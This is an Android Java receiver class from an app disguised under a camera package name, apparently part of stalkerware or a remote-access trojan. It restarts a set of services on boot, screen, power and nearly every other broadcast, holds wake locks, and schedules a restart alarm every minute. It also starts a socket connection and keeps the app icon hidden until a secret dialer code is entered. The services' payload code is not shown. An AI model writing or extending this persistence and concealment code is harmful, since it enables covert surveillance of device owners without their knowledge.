package com.android.photo.camera.capture;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;

/**
 * Enhanced Broadcast Receiver that responds to multiple system events
 * and ensures service persistence
 */
public class MyReceiver extends BroadcastReceiver {
    private static final String TAG = "MyReceiver";
    private static final long RESTART_INTERVAL = 60 * 1000; // 1 minute

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "Received broadcast: " + (intent.getAction() != null ? intent.getAction() : "null"));

        // Wake up the device if sleeping
        acquireWakeLock(context);

        // Start all services
        startAllServices(context);

        // Schedule an alarm for future restart
        scheduleServiceRestart(context);

        // Handle specific actions
        if (intent.getAction() != null) {
            switch (intent.getAction()) {
                case Intent.ACTION_BOOT_COMPLETED:
                case "android.intent.action.QUICKBOOT_POWERON":
                case "com.htc.intent.action.QUICKBOOT_POWERON":
                case Intent.ACTION_REBOOT:
                case "android.intent.action.ACTION_POWER_CONNECTED":
                case "android.intent.action.ACTION_POWER_DISCONNECTED":
                case Intent.ACTION_USER_PRESENT:
                case Intent.ACTION_SCREEN_ON:
                case Intent.ACTION_SCREEN_OFF:
                case Intent.ACTION_TIME_CHANGED:
                case Intent.ACTION_TIMEZONE_CHANGED:
                case "RestartService":
                case "RestartBackupService":
                case "RESTART_SERVICE":
                case "RESTART_SERVICE_IMMEDIATE":
                case "RESTART_BACKUP_SERVICE":
                case "CHECK_SERVICES":
                    // These actions all need the same response: ensure services are running
                    ensureAllServicesRunning(context);
                    break;

                case Intent.ACTION_NEW_OUTGOING_CALL:
                    // Handle special dialer codes for unhiding the app
                    handleOutgoingCall(context, intent);
                    break;

                case Intent.ACTION_PACKAGE_ADDED:
                case Intent.ACTION_PACKAGE_REPLACED:
                case Intent.ACTION_MY_PACKAGE_REPLACED:
                    // If our package was updated, restart everything
                    if (isOurPackage(context, intent)) {
                        ensureAllServicesRunning(context);
                    }
                    break;

                case Intent.ACTION_PACKAGE_REMOVED:
                    // If a competing app was uninstalled, recheck our status
                    ensureAllServicesRunning(context);
                    break;

                default:
                    // For any unhandled action, ensure services are running anyway
                    ensureAllServicesRunning(context);
                    break;
            }
        } else {
            // Default action when no action specified
            ensureAllServicesRunning(context);
        }
    }

    private boolean isOurPackage(Context context, Intent intent) {
        String packageName = intent.getData() != null ? intent.getData().getSchemeSpecificPart() : null;
        return packageName != null && packageName.equals(context.getPackageName());
    }

    private void acquireWakeLock(Context context) {
        PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "MyReceiver::WakeLockTag"
        );
        wakeLock.acquire(10 * 60 * 1000L);
    }

    private void ensureAllServicesRunning(Context context) {
        startAllServices(context);

        // Apply manufacturer-specific optimizations
        com.android.photo.camera.capture.Service.applyManufacturerSpecificOptimizations(context);

        // Start socket connection
        Connect.startAsync(context);

        // Schedule WackMeUpJob
        WackMeUpJob.scheduleJob(context);

        // Trigger SensorRestarterBroadcastReceiver
        Intent restartIntent = new Intent("RestartSensor");
        context.sendBroadcast(restartIntent);
    }

    private void startAllServices(Context context) {
        // Start main service
        startService(context, com.android.photo.camera.capture.Service.class);

        // Start backup service
        startService(context, BackupService.class);

        // Start worker service (mimics _srv_worker_)
        startService(context, WorkerService.class);

        // Start ClassGen5 service
        startService(context, ClassGen5Service.class);

        // Start ClassGen6 service
        startService(context, ClassGen6Service.class);

        // Start ClassGen11 service
        startService(context, ClassGen11Service.class);

        // Start MyWorker service
        startService(context, MyWorkerService.class);
    }

    private void startService(Context context, Class<?> serviceClass) {
        Intent serviceIntent = new Intent(context, serviceClass);
        serviceIntent.putExtra("fromReceiver", true);

        try {
            // Start service directly without foreground
            context.startService(serviceIntent);
            Log.d(TAG, "Started " + serviceClass.getSimpleName());
        } catch (Exception e) {
            Log.e(TAG, "Failed to start " + serviceClass.getSimpleName(), e);
        }
    }

    private void scheduleServiceRestart(Context context) {
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, MyReceiver.class);
        intent.setAction("RESTART_SERVICE");

        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                context,
                3001,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        if (alarmManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                        pendingIntent
                );
            } else {
                alarmManager.setExact(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                        pendingIntent
                );
            }
            Log.d(TAG, "Scheduled service restart via alarm");
        }
    }

    private void handleOutgoingCall(Context context, Intent intent) {
        String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

        if (phoneNumber != null &&
                phoneNumber.equalsIgnoreCase(context.getResources().getString(R.string.unhide_phone_number))) {

            SharedPreferences sharedPreferences =
                    context.getSharedPreferences("AppSettings", Context.MODE_PRIVATE);
            boolean hidden_status = sharedPreferences.getBoolean("hidden_status", false);

            if (hidden_status) {
                SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();
                appSettingEditor.putBoolean("hidden_status", false);
                appSettingEditor.apply();

                ComponentName componentName = new ComponentName(context, MainActivity.class);
                context.getPackageManager()
                        .setComponentEnabledSetting(
                                componentName,
                                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                PackageManager.DONT_KILL_APP
                        );
            }
        }
    }
}